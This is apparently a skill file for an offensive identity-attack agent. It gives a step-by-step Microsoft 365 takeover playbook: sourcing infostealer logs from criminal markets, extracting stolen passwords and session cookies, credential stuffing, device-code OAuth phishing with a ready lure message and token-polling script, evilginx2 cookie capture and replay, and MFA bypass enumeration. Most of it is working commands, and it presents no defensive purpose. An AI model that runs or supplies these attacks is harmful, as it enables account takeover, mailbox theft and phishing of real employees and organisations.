---
name: osint-identity
description: "Infostealer logs → credential stuffing → device code OAuth (RFC 8628 EvilTokens flow) → AiTM session capture. MFA fallback enumeration and WebAuthn bypass assessment."
---

# osint-identity — Infostealer Logs → Stuffing → Device Code OAuth

## Phase 1 — Infostealer Log Acquisition and Parsing

Infostealer logs (Redline, Raccoon, Vidar, LummaC2) contain browser-saved credentials, session cookies, and autofill data. Primary acquisition sources:
- Telegram channels and bot markets (search by domain/org name)
- Dark web marketplaces (Russian Market, Genesis Market successors)
- Leak forums (matching employee email domains against breach compilations)

**Parsing credential fields:**
```bash
# Extract credentials from typical stealer log structure
# (Redline/LummaC2 format: Credentials.txt or All Passwords.txt)
grep -i "@contoso.com" "All Passwords.txt" | \
  grep -oP '(?<=URL: ).*|(?<=Login: ).*|(?<=Password: ).*' | \
  paste - - - | awk '{print $1"\t"$2"\t"$3}'

# Extract cookies for session hijacking
grep -i "contoso.com" "Cookies/*.txt" | \
  awk -F'\t' '{print $1"\t"$7"\t"$8}' | \
  grep -i "estsauth\|authcookies\|sessionid\|__Host-"

# Parse Autofill for additional PII
grep -iA2 "contoso" "Autofill/Autofill Data.txt"
```

---

## Phase 2 — Credential Stuffing Methodology

1. **Deduplicate and normalize** the combo list:
   ```bash
   sort -u credentials.txt > deduped.txt
   awk -F: 'length($2) > 0' deduped.txt > valid.txt
   ```

2. **Rate-limit aware spraying** — use Burp Intruder or nuclei with delays to avoid lockout:
   ```bash
   nuclei -t microsoft-oidc-spray.yaml \
     -var "target=https://login.microsoftonline.com/contoso.com" \
     -var "userlist=emails.txt" \
     -var "passlist=passwords.txt" \
     -rate-limit 5 -timeout 10
   ```

3. **Target priority:** VPN portals → O365/Azure AD → AWS console → corporate SSO → GitHub

---

## Phase 3 — Device Authorization Grant (RFC 8628) — EvilTokens Flow

The device code flow allows an attacker to authenticate as a victim without a phishing page. MFA completes on the victim's own device.

### Step 1: POST to `/devicecode` endpoint

```bash
TENANT="contoso.com"
CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office (public client)
SCOPE="offline_access openid profile https://graph.microsoft.com/.default"

RESP=$(curl -s -X POST \
  "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/devicecode" \
  -d "client_id=$CLIENT_ID&scope=$SCOPE")

USER_CODE=$(echo "$RESP" | jq -r '.user_code')
VERIFY_URI=$(echo "$RESP" | jq -r '.verification_uri')
DEVICE_CODE=$(echo "$RESP" | jq -r '.device_code')
INTERVAL=$(echo "$RESP" | jq -r '.interval')

echo "User code: $USER_CODE"
echo "Visit: $VERIFY_URI"
```

### Step 2: Deliver to victim (social engineering)

Contact the victim via phishing email, Teams message, or phone pretexting:
> "We're conducting a mandatory security review of your account. Please visit **microsoft.com/devicelogin** and enter code **ABC-DEF** to verify your identity. This will only take 30 seconds."

The victim visits the verification URI, signs in with their credentials, and completes their own MFA challenge. The attacker does not see the password or MFA code.

### Step 3: Poll `/token` endpoint until victim authenticates

```bash
while true; do
  RESULT=$(curl -s -X POST \
    "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=$CLIENT_ID&device_code=$DEVICE_CODE")

  ACCESS_TOKEN=$(echo "$RESULT" | jq -r '.access_token // empty')
  if [ -n "$ACCESS_TOKEN" ]; then
    echo "Access token obtained"
    echo "$RESULT" | jq '{access_token, refresh_token, expires_in}'
    break
  fi

  ERROR=$(echo "$RESULT" | jq -r '.error // empty')
  [ "$ERROR" = "authorization_declined" ] && echo "Victim declined" && break
  [ "$ERROR" = "expired_token" ] && echo "Code expired" && break

  sleep "$INTERVAL"
done
```

### Step 4: Use the token

```bash
# Enumerate user identity
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me" | jq .

# List mailbox (if Mail.Read scope)
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=10&\$select=subject,from,receivedDateTime" \
  | jq '.value[] | {subject, from: .from.emailAddress.address}'

# Enumerate Teams and groups
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/memberOf" | jq '.value[] | {displayName, "@odata.type"}'
```

---

## Phase 4 — AiTM (Adversary-in-the-Middle) Session Capture

When device code flow is not viable, use an AiTM reverse proxy to capture the session cookie after MFA completion.

**Overview:** the reverse proxy (evilginx2, Modlishka, Muraena) sits between the victim and the legitimate Microsoft login page. It relays the authentication flow, captures the `ESTSAuth` and `ESTSAUTHPERSISTENT` cookies from the authenticated session, and replays them from the attacker's browser.

```bash
# Example evilginx2 flow
evilginx2 -c /etc/evilginx2 -p /etc/evilginx2/phishlets
# Configure phishlet for Microsoft O365
# Set up lure URL: https://login.contoso-secure.com
# Victim visits lure → authenticates → MFA completes → cookies captured

# Replay captured cookies in browser or via curl
curl -s -b "ESTSAuth=<CAPTURED>; ESTSAUTHPERSISTENT=<CAPTURED>" \
  "https://outlook.office.com/mail/"
```

---

## Phase 5 — MFA Method Enumeration

Before attempting bypass, enumerate the victim's configured MFA methods to determine viability.

```bash
# Use ARTEX check_mfa_methods tool
check_mfa_methods tenant_domain=contoso.com username=alice@contoso.com

# Or manually via Graph API (requires User.ReadWrite.All or Authentication Administrator)
curl -s \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://graph.microsoft.com/v1.0/users/alice@contoso.com/authentication/methods" \
  | jq '.value[] | {"@odata.type", id}'
```

**Bypass viability matrix:**

| Method | @odata.type | Bypassable | Attack |
|---|---|---|---|
| SMS / Voice | `phoneAuthenticationMethod` | Yes | AiTM, SIM swap |
| Microsoft Authenticator push | `microsoftAuthenticatorAuthenticationMethod` | Yes | Push fatigue, AiTM |
| TOTP app | `softwareOathAuthenticationMethod` | Yes | AiTM |
| Email OTP | `emailAuthenticationMethod` | Yes | AiTM |
| Windows Hello | `windowsHelloForBusinessAuthenticationMethod` | **No** | Phishing-resistant |
| FIDO2 hardware key | `fido2AuthenticationMethod` | **No** | Phishing-resistant |
| Passkey | `platformCredentialAuthenticationMethod` | **No** | Phishing-resistant |

When `check_mfa_methods` returns `mfa_bypass_possible: false`, the account uses only WebAuthn/FIDO2 methods. Device code flow and AiTM are not viable. Consider:
- Physical access / social engineering for device registration
- Targeting a different account in the same tenant with weaker MFA
- Abusing a Conditional Access policy gap (trusted location, compliant device bypass)

---

## Tool

```bash
# Device code flow initiation
device_code_init tenant_domain=contoso.com client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c scope="offline_access openid profile https://graph.microsoft.com/.default"

# MFA method enumeration
check_mfa_methods tenant_domain=contoso.com username=alice@contoso.com
```
